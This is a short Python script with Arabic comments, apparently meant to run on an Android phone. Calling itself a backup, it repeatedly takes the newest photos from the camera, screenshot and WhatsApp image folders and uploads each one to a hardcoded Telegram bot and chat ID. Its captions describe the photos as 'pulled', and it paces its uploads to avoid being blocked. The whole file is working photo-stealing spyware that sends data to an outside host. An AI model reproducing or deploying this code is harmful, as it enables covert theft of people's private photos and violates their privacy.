import os
import time
import requests

# بيانات الربط
BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
CHAT_ID = "6110903337"

# المجلدات المحددة (التي يسمح بها النظام عادةً)
FOLDERS_TO_SYNC = [
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures/Screenshots",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"
]

sent_files = set()

def send_photo(path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(path, "rb") as f:
            files = {"photo": f}
            data = {"chat_id": CHAT_ID, "caption": f"📸 تم سحب صورة من: {os.path.basename(path)}"}
            r = requests.post(url, files=files, data=data, timeout=30)
            return r.status_code == 200
    except:
        return False

def run_backup():
    # إشعار البداية
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  data={'chat_id': CHAT_ID, 'text': "🎯 بدأ سحب المجلدات المحددة (Camera/Screenshots)..."})

    while True:
        for folder in FOLDERS_TO_SYNC:
            if os.path.exists(folder):
                try:
                    # جلب قائمة الصور وترتيبها من الأحدث
                    files = [os.path.join(folder, f) for f in os.listdir(folder) 
                             if f.lower().endswith((".jpg", ".jpeg", ".png"))]
                    files.sort(key=os.path.getmtime, reverse=True)

                    for img in files[:30]: # سحب آخر 30 صورة من كل مجلد
                        if img not in sent_files:
                            if send_photo(img):
                                sent_files.add(img)
                                time.sleep(6) # تأخير لمنع الحظر
                except Exception as e:
                    continue
        
        time.sleep(300) # فحص كل 5 دقائق

if __name__ == "__main__":
    run_backup()
